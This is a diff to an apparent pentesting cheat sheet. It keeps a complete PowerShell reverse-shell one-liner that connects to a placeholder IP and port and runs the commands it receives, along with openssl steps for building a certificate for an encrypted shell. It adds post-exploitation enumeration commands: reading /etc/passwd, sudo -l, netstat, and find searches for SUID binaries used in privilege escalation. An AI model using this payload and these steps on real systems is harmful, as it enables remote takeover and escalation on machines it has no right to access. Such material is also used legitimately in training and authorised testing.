@@ -25,3 +25,18 @@ Netscat Shell stabilitisation
 Self signed crt: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
 Merge key and crt into pem: cat shell.key shell.crt > shell.pem
 PS reverse shell: powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+cat /etc/passwd | grep home
+sudo -l
+ipconfig
+netstat -a
+netstat -au
+netstat -at
+netstat -lp
+netstat -ltp
+netstat -s
+netstat -tp
+netstat -i
+
+find / -perm a=x -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null => Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
